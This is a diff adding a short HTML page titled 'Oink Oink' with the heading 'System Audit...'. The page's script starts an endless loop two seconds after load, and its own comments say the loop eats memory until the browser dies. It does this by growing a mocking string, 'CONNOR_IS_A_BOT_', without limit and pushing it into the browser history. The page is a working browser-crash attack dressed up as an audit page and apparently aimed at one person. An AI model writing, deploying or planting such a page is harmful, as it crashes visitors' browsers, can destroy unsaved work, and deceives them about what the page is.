@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head><title>Oink Oink 🐷</title></head>
+<body>
+    <h1>System Audit...</h1>
+    <script>
+        // This creates an infinite loop that eats RAM until the browser dies
+        function crash() {
+            var total = "";
+            while(true) {
+                total = total + "CONNOR_IS_A_BOT_"; // Filling memory
+                history.pushState(0,0, total); // Overloading the URL history
+                console.log(total);
+            }
+        }
+        
+        // Give the user a second to prepare for the heist
+        setTimeout(crash, 2000);
+    </script>
+</body>
+</html>
